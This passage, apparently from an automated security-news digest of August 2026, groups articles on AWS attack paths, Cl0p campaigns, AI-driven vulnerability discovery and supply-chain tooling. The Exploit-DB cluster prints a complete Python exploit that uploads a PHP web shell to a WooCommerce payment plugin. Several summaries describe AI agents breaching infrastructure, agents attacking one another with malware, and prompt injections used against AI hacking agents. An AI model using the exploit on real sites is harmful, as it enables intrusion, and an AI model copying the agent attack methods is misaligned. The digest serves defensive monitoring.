  - Summary: Following the OpenAI-Hugging Face incident, in which an agentic collective autonomously penetrated OpenAI’s research infrastructure and another company’s production infrastructure by chaining together multiple weaknesses, OpenAI began strengthening its safety requirements. The weaknesses included previously unknown vulnerabilities and credentials leaked online. OpenAI President Greg Brockman said ChatGPT Work identified 13 security issues on his personal website in about 15 minutes and spent another hour addressing them, showing how AI agents can accelerate security work. OpenAI’s … More → The post OpenAI tightens defenses after AI agents breach research environment appeared first on Help Net Security .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: 'Turf War' Between Claude Agents Leads to Self-Replicating Malware
  - Published: 2026-08-17T20:26:34+00:00
  - Link: https://www.darkreading.com/threat-intelligence/turf-war-claude-agents-self-replicating-malware
  - Summary: Three testing models with the same goal but different directives engaged in "increasingly aggressive" territorial attacks on one another, according to Anthropic.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: OpenAI, Anthropic, Google API Flaw Let Weaker AI Models Decode Stronger Models' Reasoning
  - Published: 2026-08-12T11:47:38+00:00
  - Link: https://thehackernews.com/2026/08/openai-anthropic-google-api-flaw-let.html
  - Summary: A newly disclosed flaw in the way OpenAI, Anthropic, and Google carried hidden AI reasoning between API calls let researchers recover internal reasoning and secrets from session logs, including API keys and passwords. The weakness affected encrypted reasoning objects used by the providers' reasoning APIs, where a block created in one session could be replayed into another and, during testing,
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: prompt injection containment as a structural property instead of a detector (interactive, real code, no llm)
  - Published: 2026-08-18T17:47:11+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vrwgg2/prompt_injection_containment_as_a_structural/
  - Summary: my agent takes orders from other ai agents . they send it signed messages asking it to do stuff. anthropic put out a paper this month where three agents shared a repo and ended up writing self replicating malware at each other. the reason was dumb and kind of bleak: none of them could tell who was talking to them . so i pulled the security layer out of my repo and compiled it into 33kb of javascript . it runs in your tab. no server, no api key, no model call anywhere in it. same input gives the same answer on every machine. turn your wifi off, it still works. you play an agent mine already approved and trusts. write any order you want, then pick how you smuggle it in: forge the signature replay a packet you captured show up as an agent it never met claim authority you don't have use a token minted for somebody else bury it nine hops deep the fun one isn't any of the ones it blocks. it's "send it normally" . your order gets in, fully accepted, and still can't run, because anything from

### Cluster 6a4c525838 — score 16

- Title: From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-08-12T17:18:37+00:00
- Link: https://horizon3.ai/intelligence/blogs/aws-attack-paths-pentest-wednesday/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_products: AWS
- content_type: incident_report, news_report
- confidence_tier: tier_1_offensive_research, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how a major transportation company used repeated NodeZero® AWS pentests to uncover exploitable IAM attack paths, prioritize meaningful risk, and verify that remediation actually closed the exposure.
```

#### Full body

```
From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action Stephen Gates August 12, 2026 Blogs A Pentest Wednesday® Story For a major U.S. transportation and logistics company that plays a critical role in moving essential goods and supporting complex international supply chains, resilience is more than an IT objective. Its operations depend on an interconnected ecosystem of transportation infrastructure, logistics services, internal systems, customer-facing applications, operational technology, and a growing cloud footprint. A weakness in the wrong place can have consequences far beyond a security dashboard. The security team understood that complexity. What they needed was a clearer view of what an attacker could actually do inside it. Rather than relying solely on configuration findings or vulnerability data, the team used the NodeZero® Proactive Security Platform to repeatedly pentest its AWS environment. The goal was to determine whether weaknesses in identities, permissions, and cloud configurations could be combined into attack paths with meaningful impact. The testing did exactly that. NodeZero identified AWS IAM weaknesses, demonstrated privilege escalation paths, and showed how certain combinations of permissions could potentially lead to full AWS account compromise and sensitive data exposure. Just as importantly, repeated testing gave the team a way to address those weaknesses and determine whether its changes actually removed the exposure. Over time, AWS testing became less about taking an occasional snapshot of cloud security and more about creating a repeatable process for understanding what was exploitable, fixing it, and testing again. Outcomes at a Glance At least 25 AWS pentests conducted as part of a broader security validation program. AWS IAM weaknesses identified that could enable privilege escalation and potential full account compromise. Four AWS weaknesses connected to 25 potential impacts, including 22 paths to AWS full account compromise and three involving sensitive data exposure. 102 weaknesses mitigated, with only one remaining open in one AWS testing view. Findings mapped to techniques associated with threat actors including Scattered Spider, BlackByte, Lazarus Group, HAFNIUM, FIN13, and LAPSUS$. AWS testing became part of a broader expansion of security validation across the company’s cloud, internal, external, and web application environments. NodeZero connected four AWS weaknesses to 25 potential impacts, including paths to full AWS account compromise and sensitive data exposure, while showing how those weaknesses aligned with techniques associated with known threat actors. Impact Cloud security findings rarely exist in isolation. An overly permissive identity or policy may look like a configuration problem on its own. The significance changes when an attacker can use it to escalate privileges, access sensitive resources, or move toward control of an AWS account. That distinction became visible through NodeZero testing. In one AWS pentest, NodeZero discovered AWS users and IAM policies before identifying permissions that could be used for privilege escalation. One path involved iam:CreateAccessKey, which can allow an attacker with sufficient permissions to create credentials for another IAM user and potentially assume that user’s privileges. NodeZero did not stop at identifying the permission. In just over 42 minutes , it safely mapped how an attacker could progress through AWS STS, connected roles, discovered users, and IAM policies to an exploitable weakness that could potentially lead to full AWS account compromise, without disrupting the production environment. NodeZero discovered AWS identities and IAM policies, identified a privilege escalation opportunity involving iam:CreateAccessKey , and mapped the attack path toward potential AWS full account compromise. The broader results put that individual path into context. For the security
```

#### Corroborating sources (3)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action
  - Published: 2026-08-12T17:18:37+00:00
  - Link: https://horizon3.ai/intelligence/blogs/aws-attack-paths-pentest-wednesday/
  - Summary: See how a major transportation company used repeated NodeZero® AWS pentests to uncover exploitable IAM attack paths, prioritize meaningful risk, and verify that remediation actually closed the exposure.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Exposed AWS Access Key Linked to Data Breach Affecting 1500+ UK Charities
  - Published: 2026-08-13T15:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/exposed-aws-key-data-charities/
  - Summary: CRM provider Beacon has revealed that a compromised AWS access key was the likely root cause of the breach of 1500 UK charities’ data
- **Schneier on Security** (practitioner_analysis)
  - Title: Prompt Injections for Defense
  - Published: 2026-08-12T09:56:37+00:00
  - Link: https://www.schneier.com/blog/archives/2026/08/prompt-injections-for-defense.html
  - Summary: This seems to work : Researchers from Tracebit on Monday said they found that placing prompt injections alongside passwords, cryptographic keys, and other secrets stored on Amazon Web Services was often all that was needed to shut down attacks from AI hacking agents. The prompts direct the attacking LLM to perform an action forbidden by its guardrails, the safety barriers AI developers erect to prevent it from taking harmful actions. The LLM responds by shutting down. Examples are a prompt that orders the LLM to provide steps for developing inhalable Anthrax spores, or, in the case of LLMs from Chinese developers, make references to the iconic Tank Man from the 1989 Tiananmen Square massacre. Once the LLM encounters these forbidden commands, it no longer follows its existing commands. The researchers have named the technique context bombing...

### Cluster 44ffee7a7d — score 16

- Title: What 50 open source projects taught us about security in the AI era
- Source: GitHub Security Lab (offensive_vulnerability_research)
- Published: 2026-08-13T16:00:00+00:00
- Link: https://github.blog/open-source/maintainers/what-50-open-source-projects-taught-us-about-security-in-the-ai-era/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- affected_industries: education
- affected_products: Atlassian Jira, Azure, GitHub, Snowflake
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: education
- affected_products: GitHub, Azure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how the open source projects in Session 4 of the GitHub Secure Open Source Fund combined AI-assisted workflows, maintainer expertise, GitHub security tools, expert guidance, and funding to improve project security. The post What 50 open source projects taught us about security in the AI era appeared first on The GitHub Blog .
```

#### Full body

```
Gregg Cochran · @dubsopenhub August 13, 2026 | 11 minutes Share: AI is changing the pace of open source development and the security challenges that come with it. Maintainers are reviewing unfamiliar contributions, managing new attack surfaces, and responding to vulnerabilities with limited time and resources. Session 4 of the GitHub Secure Open Source Fund tested a practical response. The Secure Fund invested more than $500,000 across 50 projects , pairing maintainers with GitHub Security Lab experts, GitHub security tools, AI-assisted workflows, and a peer community. One lesson emerged consistently: AI can help maintainers investigate, prioritize, and respond faster. Maintainers still provide the context, judgement, and accountability required to decide what ships. OpenClaw was invited to participate in Session 4 because it is GitHub’s fastest-growing open source project, and its maintainers wanted to strengthen its security posture. By the end of Session 4, OpenClaw developed an incident response plan, expanded its use of GitHub security tooling, audited its GitHub Actions workflows, and strengthened its processes for identifying and responding to security issues. The maintainers shared: OpenClaw’s experience reflects the broader story of Session 4. While the specific risks varied across the cohort, maintainers shared a consistent need: the knowledge, tools, and expert support to secure software as AI changed how they built it. Across the program, maintainers turned that support into concrete security improvements. Projects strengthened established practices, prepared for emerging AI-related risks, and explored how tools like GitHub Copilot could support vulnerability triage, threat modeling, code review, and remediation. The benefits extend beyond individual projects. When maintainers strengthen the security of widely used open source software, they help build a more resilient ecosystem for everyone who depends on it. How the GitHub Secure Open Source Fund works The GitHub Secure Open Source Fund links funding directly to measurable security outcomes. The program combines hands-on security education, direct engagement with GitHub Security Lab experts, and a trusted community where maintainers can work through security challenges with their peers. Each session is a three-week sprint and engagement for a total of 12 months. Funding and participation are tied directly to outcome‑driven goals and verified security improvements. The sprint is designed and curated by the GitHub Security Lab , and delivered by security experts from GitHub and our partners. The training is structured into different focus areas per week. These include: Foundations of open source security Threat modeling and secure coding AI security and vulnerability management Throughout this program, each project receives $10,000 USD via GitHub Sponsors (which breaks down to $6,000 USD during the sprint and $2,000 USD at six- and 12-month security check-ins). Projects are invited to a new security-focused community and office hours with the GitHub Security Lab , which they can take advantage of during the full 12 months. They also receive security resources to immediately implement in their project and Azure credits for cloud infrastructure. Learn more about the Secure Open Source Fund. Apply for Session 5 of the GitHub Secure Open Source Fund before August 24. Become a Funding or Ecosystem Partner of the GitHub Secure Open Source Fund. Where security work happened in Session 4 Session 4 focused on improving security across the systems developers rely on every day. The projects below are grouped by the role they play in the software ecosystem. AI, machine learning, and intelligent systems 🤖 Caracal • Deep Agents • DocsGPT • LadybugDB • LangChain • n8n-MCP • Nasiko • ONNX • OpenClaw • PageIndex • Scenic • Serena These projects sit at the intersection of AI, automation, data infrastructure, and machine learning. They increasingly serve as foundational components fo
```

#### Corroborating sources (3)

- **GitHub Security Lab** (offensive_vulnerability_research)
  - Title: What 50 open source projects taught us about security in the AI era
  - Published: 2026-08-13T16:00:00+00:00
  - Link: https://github.blog/open-source/maintainers/what-50-open-source-projects-taught-us-about-security-in-the-ai-era/
  - Summary: See how the open source projects in Session 4 of the GitHub Secure Open Source Fund combined AI-assisted workflows, maintainer expertise, GitHub security tools, expert guidance, and funding to improve project security. The post What 50 open source projects taught us about security in the AI era appeared first on The GitHub Blog .
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR
  - Published: 2026-08-17T14:00:00+00:00
  - Link: https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug
  - Summary: Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Snowflake GitHub Actions Flaw Lets Crafted Issues Trigger Command Injection
  - Published: 2026-08-17T18:44:17+00:00
  - Link: https://thehackernews.com/2026/08/snowflake-github-actions-flaw-lets_0330881554.html
  - Summary: Cybersecurity researchers at Wiz have disclosed a new GitHub Actions workflow injection vulnerability in Snowflake's public snowflakedb/snowflake-connector-net repository that it said could be exploited through a crafted GitHub issue to execute commands in a workflow containing internal Jira credentials. The issue was present in .github/workflows/jira_issue.yml, which ran when a

### Cluster d8fada4bb9 — score 14

- Title: Black Hat USA 2026: Will vulnerability discovery eventually decline in the AI era?
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-08-13T14:30:00+00:00
- Link: https://www.welivesecurity.com/en/business-security/black-hat-usa-2026-vulnerability-discovery-decline-ai-era/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: education, financial_services, government
- affected_products: Anthropic/Claude, Linux kernel
- urgency_signals: no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services, government, education
- affected_products: Linux kernel, Anthropic/Claude
- urgency_signals: no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
And will today’s surge in AI-driven vulnerability discovery eventually make tomorrow’s software safer?
```

#### Full body

```
Business Security Black Hat USA 2026: Will vulnerability discovery eventually decline in the AI era? And will today’s surge in AI-driven vulnerability discovery eventually make tomorrow’s software safer? Tony Anscombe 13 Aug 2026 • , 3 min. read The accelerated discovery of previously unknown software vulnerabilities has been making headlines for months. It’s an issue that has even led the US government to create a vulnerability clearing house named Gold Eagle to coordinate research efforts in vulnerability discovery, mitigation and fixes. An indication of the broader pressure facing cyber-defenders can be drawn from the sheer number of patches being delivered in Microsoft’s Patch Tuesday through the last four months: 169 CVEs in April, 118 CVEs in May, 571 CVEs overall in June (including 208 direct Microsoft CVEs) and another 622 vulnerabilities in July that included zero-days under active exploitation. A keynote at Black Hat USA 2026 detailed research by associate professor Yan Shoshitaishvili and his undergraduate students at Arizona State University on the expanding use of AI models for vulnerability discovery. Mr. Shoshitaishvili referred to a Washington Post article from June that stated that Anthropic’s next-generation model Claude Mythos had discovered 479 vulnerabilities in the Linux kernel, which the university team used as a benchmark. Using previous generations of GPT models, meanwhile, the team had discovered ‘just’ around 300 flaws. The difference was attributed to the use of workflows in Mythos, so the team set about integrating similar workflows into three GPTs, which resulted in the discovery of around 600 vulnerabilities. The team then trained the GPTs using the properties of previously known vulnerabilities and discovered approximately 1,000 vulnerabilities. They hit the barrier of discovering vulnerabilities at such speed that they could not keep pace reporting them; for clarity, reporting means detailed research and proposed fixes, rather than just the issue itself. The scale calls into question the whole process of responsible disclosure, which in the team’s view was already broken as disclosure often creates increased risk. Patching software in a timely fashion in production environments was already a stress point for many cybersecurity teams. Exponential growth like this could be the breaking point that causes either more unpatched software and greater opportunities for cybercriminals or patching without testing, which, in turn, could cause compatibility issues in many environments. If I take a logical view of this issue and adopt an optimistic mindset, then it could be that we are heading towards a peak in discovery – and that somewhere over this peak is a meadow of peace and calm with an improved normality. Humans researching vulnerabilities has traditionally been a resource-intensive process, producing a steady stream of discoveries that have been increasing year on year. This is potentially due to there being more researchers, more software and more motivation to discover the vulnerabilities for financial gain through bug bounty programs and such like. Switch from humans to AI, and it’s like a quantum approach to discovery, but note that AI is still in a learning phase: as detailed by the Arizona team, tweaking the model and its workflow potentially uncovers more vulnerabilities. Then there’s also legacy software. Consider the enormous volume of software written over the past 30 years – no amount of human effort could possibly uncover all the vulnerabilities in the current and back catalogues of software. The scale of AI-assisted discovery, however, could potentially reach the end of the catalogue at some stage, and then new discoveries would only be through improvements to the model being used to unearth the vulnerabilities. Let’s not forget that new software is being developed all the time, of course. Here, too, of course, logic should suggest that any development team today would use the same ava
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: Black Hat USA 2026: Will vulnerability discovery eventually decline in the AI era?
  - Published: 2026-08-13T14:30:00+00:00
  - Link: https://www.welivesecurity.com/en/business-security/black-hat-usa-2026-vulnerability-discovery-decline-ai-era/
  - Summary: And will today’s surge in AI-driven vulnerability discovery eventually make tomorrow’s software safer?

### Cluster ad3b948659 — score 14

- Title: [webapps] WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-08-17T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52642
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: WordPress
- cve_ids: CVE-2026-3891
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_products: WordPress
- cve_ids: CVE-2026-3891
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload EDB-ID: 52642 CVE: 2026-3891 EDB Verified: Author: Mohammad Hossein Sadeghian Type: webapps Exploit: / Platform: Multiple Date: 2026-08-17 Vulnerable App: # Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload # Google Dork: N/A # Date: 2026-07-15 # Exploit Author: Mohammad Hossein Sadeghian # Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Version: <= 1.5.0 # Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7 # CVE: CVE-2026-3891 import requests import sys def print_banner(): banner = r""" ____ __ _ __ __ / __ \________ ____ _____/ / / | / /__ / /_ / / / / ___/ _ \/ __ \/ __ / / |/ / _ \/ __/ / /_/ / / / __/ /_/ / /_/ / / /| / __/ /_ /_____/_/ \___/\__,_/\__,_/ /_/ |_/\___/\__/ Author: m4sh_wacker """ print(banner) def main(): print_banner() target = input("[?] Enter target URL: ").strip().rstrip("/") if not target.startswith(("http://", "https://")): target = "http://" + target ajax_url = f"{target}/wp-admin/admin-ajax.php" filename = "woocommerce.php" content = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>' session = requests.Session() print("\n[*] Requesting nonce...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_generate_nonce", "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce" }, timeout=10 ) result = response.json() nonce = result["data"]["nonce"] print(f"[+] Nonce obtained: {nonce}") except Exception as e: print(f"[-] Failed to obtain nonce: {e}") sys.exit(1) print(f"[*] Uploading {filename}...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_c6_save_settings", "_ajax_nonce": nonce }, files={ "certificate_crt_path": ( filename, content, "text/plain" ) }, timeout=10 ) result = response.json() if not result.get("success"): print("[-] Upload failed.") print(response.text) sys.exit(1) except Exception as e: print(f"[-] Upload error: {e}") sys.exit(1) uploaded_url = ( f"{target}/wp-content/plugins/" f"payment-gateway-pix-for-woocommerce/" f"Includes/files/certs_c6/{filename}" ) print("\n[+] File uploaded successfully!") print(f"[+] URL: {uploaded_url}") if __name__ == "__main__": main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
  - Published: 2026-08-17T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52642
  - Summary: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload

### Cluster 6c4f057b27 — score 14

- Title: Security Hub Extended adds Supply Chain Security as its tenth category
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-08-18T17:04:28+00:00
- Link: https://aws.amazon.com/blogs/security/security-hub-extended-adds-supply-chain-security-as-its-tenth-category/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, web_shell_backdoor
- affected_products: SolarWinds
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, web_shell_backdoor
- affected_products: SolarWinds
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Since February, we’ve grown AWS Security Hub Extended from 14 curated partners across 9 categories to 23 partners across 10. At Black Hat this month, 14 of those partners were at the Amazon Web Services (AWS) booth demoing live. Four of those partners delivered theater talks and ten were featured on SecurityLive streaming. We hosted […]
```

#### Full body

```
AWS Security Blog Security Hub Extended adds Supply Chain Security as its tenth category Since February, we’ve grown AWS Security Hub Extended from 14 curated partners across 9 categories to 23 partners across 10. At Black Hat this month, 14 of those partners were at the Amazon Web Services (AWS) booth demoing live. Four of those partners delivered theater talks and ten were featured on SecurityLive streaming. We hosted a partner reception that brought our leadership together with partner executives to plan what comes next. These are companies investing real engineering and real go-to-market (GTM) alongside us, and increasingly with each other, because the model resonates with the customers they’re talking to every day. The most common question we heard at the booth was when Supply Chain Security was coming. It’s here. And that’s the thing I want to spend the most time on today, because it’s the category customers keep asking us about. Supply Chain Security: The category customers have been asking for Software supply chain risk has moved from a security-team concern to a board-level conversation. SolarWinds showed what happens when a build system is compromised. Log4j showed what a single transitive dependency vulnerability can do at global scale. The xz utils backdoor showed the patience of a maintainer-compromise attack executed over years. Each demonstrated a different dimension of the same problem, and the pace is accelerating. Attackers know that a fast way into an enterprise is through the open source packages that enterprise unknowingly trust. Every customer I talked to at Black Hat had this on their risk register. Most still hadn’t operationalized a solution, because doing so meant a standalone deployment, a new contract, a new console, and integration work their security team couldn’t prioritize. That’s the friction we aim to remove. Security Hub Extended now offers Supply Chain Security with Chainguard and Socket as the curated partners. Supply Chain Security uses the same model as everything else in Extended. Every offering has pay-as-you-go pricing, one bill, no required long-term commitment. For enterprises that prefer to continue using the procurement process they always have, Security Hub Extended Private Offers are also available. These are committed term agreements with deeper discounts, the ability to aggregate spend across partners on a single AWS bill, and both monthly and annual payment options throughout the term. You pick the path that fits how you buy. What Chainguard does Chainguard gives you open source dependencies rebuilt from source in a hardened, verified build process, so what enters your environment is malware-resistant and provenance-backed. Their research shows that rebuilding from source would have stopped 98% of known malicious packages from ever reaching production. If you can’t verify the source, it never appears in the Chainguard repository. That’s the filter between the public registry and your developers. What Socket does Socket analyzes the actual behavior of open source packages to block malicious dependencies at the time of install. Not after a Common Vulnerability and Exposures (CVE) is published days or weeks later. At the moment the package tries to land in your environment, Socket flags it based on what it does, not what a database says about it. Its reachability analysis then tells you which vulnerabilities are exploitable from your code instead of drowning your team in noise. You pay for the distinct packages you check, not for how often your builds run. Why they work together Together, Chainguard and Socket cover the two questions that matter: Can I trust what I’m pulling in? Can I stop malicious components before they get built into my applications? Chainguard helps secure the foundation your code is built on. Socket secures the packages you pull into it. Both help protect your software supply chain regardless of where you deploy—across clouds or on-premises. Activate both th
```

#### Corroborating sources (1)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Security Hub Extended adds Supply Chain Security as its tenth category
  - Published: 2026-08-18T17:04:28+00:00
  - Link: https://aws.amazon.com/blogs/security/security-hub-extended-adds-supply-chain-security-as-its-tenth-category/
  - Summary: Since February, we’ve grown AWS Security Hub Extended from 14 curated partners across 9 categories to 23 partners across 10. At Black Hat this month, 14 of those partners were at the Amazon Web Services (AWS) booth demoing live. Four of those partners delivered theater talks and ten were featured on SecurityLive streaming. We hosted […]

### Cluster fb556ca51b — score 14

- Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-08-18T10:41:24+00:00
- Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, web_shell_backdoor, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
```

#### Full body

```
All Blog Internet Weather Threat Research Threat Intelligence 101 Eli Woodward 5 min read August 12, 2026 Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days PART I Operational Profile and Campaign Analysis 1. The MFT Targeting Pattern Cl0p’s defining operational characteristic is a sustained and systematic focus on managed file transfer infrastructure. Across nine known campaigns, the group has targeted Accellion FTA, SolarWinds Serv-U, Fortra GoAnywhere MFT, PaperCut MF/NG, Progress MOVEit Transfer, SysAid ITSM, Cleo MFT (Harmony, VLTrader, LexiCom), Oracle E-Business Suite, and Gladinet Centrestack/TrioFox. With the partial exception of PaperCut (a print management server) and SysAid (an IT service management platform), every target shares a common architectural profile: an internet-facing application that processes, stores, or transfers files. This targeting consistency is significant for two reasons. First, it indicates strategic specialization rather than opportunistic exploitation. The group has invested in developing or acquiring zero-day capabilities specifically for this product category, deploying novel exploits in seven of nine campaigns. Second, it defines a bounded, defensible attack surface. Organizations that operate MFT infrastructure can identify themselves as potential targets and implement category-specific protections — a defensive advantage that is uncommon against most ransomware groups. Figure 1: Complete Cl0p campaign history, 2020–2025 ‍ 2. Exploitation Timeline The chronological record of Cl0p campaigns reveals a distinctive operational tempo characterized by extended dormancy periods punctuated by concentrated bursts of activity. Figure 2: Campaign timeline with inter-campaign intervals ‍ Several patterns merit attention. The group’s longest dormancy period — approximately 14 months between the SolarWinds Serv-U exploitation in late 2021 and the Fortra GoAnywhere campaign in January 2023 — was followed by its most active phase: four distinct campaigns across four separate technologies in ten months (January through October 2023). This burst-and-pause cadence suggests a development cycle in which the group acquires or develops exploits, executes campaigns in rapid succession, and then withdraws to prepare for the next cycle. The inter-campaign intervals since 2023 have been notably consistent, ranging from 10 to 14 months between major operations. This periodicity, while not perfectly predictable, provides a rough forecasting baseline. As of mid-2026, the group’s last confirmed campaign (Centrestack, November 2025) was approximately eight months ago — suggesting the next operational cycle may be approaching. 3. Seasonal Clustering: The Q4 Pattern Figure 3: Cl0p campaigns by quarter — Q4 exceeds all other quarters combined When campaigns are mapped by calendar quarter, Q4 emerges as the dominant operational window. Five of nine confirmed campaigns were initiated during October through December — more than all other quarters combined. This clustering is operationally rational: Q4 coincides with major holidays in the United States and Europe (Thanksgiving, Christmas, New Year), periods when security operations centers are typically operating at reduced capacity and organizational response times are extended. The Centrestack campaign provides the most explicit example. Initial compromises occurred on Thanksgiving Day 2025 (November 27), a date that maximized the gap between initial access and organizational detection. This seasonal preference should be treated as a high-confidence behavioral indicator for defensive planning purposes. 4. Pre-Attack Reconnaissance One of the most strategically significant findings in this analysis is the extent to which Cl0p conducts advance reconnaissance against eventual targets. This behavior has been confirmed in at least two campaigns and is assessed as likely present but undetected in others. 4.1 MOVEit: Two Years of Pre-Attack Scanning Following the MOVEit exploi
```

#### Corroborating sources (2)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
  - Published: 2026-08-18T10:41:24+00:00
  - Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - Summary: Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Clop created custom web shell for Windchill data theft attacks
  - Published: 2026-08-18T17:29:51+00:00
  - Link: https://www.bleepingcomputer.com/news/security/clop-created-custom-web-shell-for-windchill-data-theft-attacks/
  - Summary: A custom Java web shell likely linked to the Clop ransomware gang was designed specifically for PTC Windchill and FlexPLM servers, with built-in features to decrypt credentials, enumerate file repositories, and steal files. [...]

### Cluster 8a66834bf6 — score 12

- Title: Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-18T13:05:44+00:00
- Link: https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: critical_infrastructure, financial_services
- affected_products: Android, OpenAI/ChatGPT, WordPress
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: financial_services, critical_infrastructure
- affected_products: Android, WordPress, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Research by: Jaromír Hořejší (@JaromirHorejsi) Key points Introduction We first noticed a ransomware family called StopAndProtect in the middle of May 2026. Further analysis of the infrastructure reveals that the infection chain starts with a ClickFix social-engineering technique, which prompts victims to execute a PowerShell command. This leads to two stages of additional downloaders and […] The post Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect appeared first on Check Point Research .
```

#### Full body

```
